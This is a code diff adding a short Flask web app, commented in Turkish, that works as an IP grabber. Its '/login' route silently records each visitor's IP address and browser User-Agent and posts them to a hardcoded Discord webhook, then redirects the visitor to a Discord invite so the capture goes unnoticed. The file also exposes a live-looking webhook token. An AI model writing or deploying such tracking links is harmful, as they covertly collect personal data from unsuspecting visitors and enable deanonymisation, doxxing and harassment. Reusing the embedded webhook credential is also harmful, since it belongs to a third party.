@@ -1,0 +1,31 @@
+from flask import Flask, request, redirect
+import requests
+
+app = Flask(__name__)
+
+# Discord Webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1508414724902092931/icMbQRZYOvpPFnxINRJ-xR4_2e6ISaCwM9rptGu0-1fhnyk-2qDJWjrVpHDXhhjNwAK5"
+
+@app.route('/login')
+def index():
+    # 1. IP ve cihaz bilgilerini yakala
+    ip_address = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+    
+    # 2. Veriyi formatla
+    embed = {
+        "title": "Yeni Ziyaretçi!",
+        "fields": [
+            {"name": "IP Adresi", "value": ip_address},
+            {"name": "Cihaz Bilgisi", "value": user_agent}
+        ]
+    }
+    
+    # 3. Discord'a gönder
+    requests.post(WEBHOOK_URL, json={"embeds": [embed]})
+    
+    # 4. Kullanıcıyı gerçek hedefe yönlendir
+    return redirect("https://discord.gg/sWMVSs5sE")
+
+if __name__ == "__main__":
+    app.run(port=80)
